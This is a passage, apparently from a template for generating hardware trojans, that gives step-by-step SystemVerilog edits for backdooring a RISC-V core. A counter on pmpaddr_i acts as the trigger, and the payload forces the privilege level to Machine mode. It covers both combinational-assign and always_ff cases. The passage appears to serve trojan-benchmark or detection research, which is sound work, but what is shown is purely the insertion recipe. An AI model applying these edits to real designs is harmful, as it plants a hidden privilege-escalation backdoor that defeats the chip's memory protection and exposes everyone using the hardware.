 ...
 *   
 * Trigger: Counter on pmpaddr_i
 * Payload: Force priv_lvl_t to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override priv_lvl_t to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If priv_lvl_t has a combinational assign:
//   Find:    assign priv_lvl_t = <priv_expr>;
//   Replace: assign priv_lvl_t = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If priv_lvl_t is updated inside always_ff:
//   Find the last assignment to priv_lvl_t in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) priv_lvl_t <= PRIV_LVL_M;
//
